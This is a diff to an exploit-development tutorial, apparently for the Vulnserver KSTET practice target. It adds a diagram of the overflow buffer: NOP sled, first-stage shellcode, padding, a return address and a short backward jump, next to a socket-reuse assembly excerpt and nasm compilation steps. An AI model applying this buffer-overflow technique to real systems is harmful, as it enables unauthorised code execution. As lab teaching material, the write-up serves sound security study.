@@ -389,6 +389,28 @@ Due to the limited space on the stack we have to work with (66-bytes) we will be
 	jnz socket_loop         ; If recv() failed, jump back to the socket loop where
 							; EDI will be increased to check the next socket handle
 	```
+
+```
+         |----------------------------------|
+         | b'KSTET '                        |
+         |----------------------------------|
+         | b'\x90' * 8                      |
+         |----------------------------------|
+         | STAGE1                           |
+         |----------------------------------|
+         | b'A' * (58 - 8 - len(STAGE1))    |
+         |----------------------------------|
+         | struct.pack('<L', 0x62501023)    |
+         | ---------------------------------|
+         | b'\xeb\xc5'                      |
+ESP ->   |----------------------------------| 
+         | b'C' * (24)                      |
+         |----------------------------------|
+
+```
+
+
+ 
 5. Use [`nasm`](https://nasm.us/) on the *Kali Linux* machine to compile the assembly into the appropriate shellcode.
 	1) Ensure nasm is installed, if not you will need to [install it](https://nasm.us/) and add it to the path.
 
